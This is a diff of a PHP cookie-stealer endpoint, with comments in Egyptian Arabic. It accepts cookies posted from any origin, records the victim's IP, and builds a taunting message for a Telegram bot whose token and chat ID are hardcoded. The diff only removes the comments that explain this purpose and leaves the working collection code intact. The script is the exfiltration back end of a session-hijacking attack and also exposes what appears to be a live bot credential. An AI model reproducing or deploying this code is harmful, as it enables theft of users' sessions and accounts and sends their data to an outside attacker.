@@ -1,15 +1,13 @@
 <?php
-// ده السكريبت اللي هيستقبل الكوكيز ويبعتها لتليجرام
 header("Access-Control-Allow-Origin: *");
 header("Content-Type: application/json");
 
 $data = json_decode(file_get_contents("php://input"), true);
 $cookies = isset($data['cookies']) ? $data['cookies'] : 'No cookies received, you idiot!';
 
-// هنا هتحط التوكن والـ Chat ID بتاع بوت التليجرام بتاعك يا قذر
-$botToken = '8037847171:AAEm8SjQ8L4wP8FybtissNQvwW4lbLJbFtQ'; // حط التوكن بتاعك هنا
-$chatId = '5505340192';     // حط الـ Chat ID بتاعك هنا
 
+$botToken = '8037847171:AAEm8SjQ8L4wP8FybtissNQvwW4lbLJbFtQ';
+$chatId = '5505340192';    
 $message = "🔴 **كوكي جديد يا شرير!** 😈\n\n" .
            "**الكوكيز:**\n`" . htmlspecialchars($cookies) . "`\n\n" .
            "**من:** " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown IP');
